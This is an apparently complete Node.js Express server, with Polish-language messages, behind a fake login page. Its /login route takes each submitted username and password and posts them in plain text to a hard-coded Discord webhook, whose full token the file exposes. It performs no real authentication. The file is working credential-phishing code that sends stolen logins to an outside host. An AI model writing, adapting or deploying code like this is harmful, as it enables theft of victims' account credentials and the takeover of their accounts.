const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1265337260333727804/uB3iYmU1vrQlQUSU4EbRrLHqR8AKKtqfBgpLj9_t0Dx0vB3wXTnckBb3zuQiuvDVBFcV';

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/login', (req, res) => {
    const { username, password } = req.body;

    const message = {
        content: `Login: ${username}\nHasło: ${password}`
    };

    axios.post(DISCORD_WEBHOOK_URL, message)
        .then(response => {
            res.status(200).send('Dane zostały wysłane na Discord!');
        })
        .catch(error => {
            console.error('Błąd wysyłania danych na Discord:', error);
            res.status(500).send('Wystąpił błąd podczas wysyłania danych na Discord.');
        });
});

app.listen(PORT, () => {
    console.log(`Serwer nasłuchuje na porcie ${PORT}`);
});
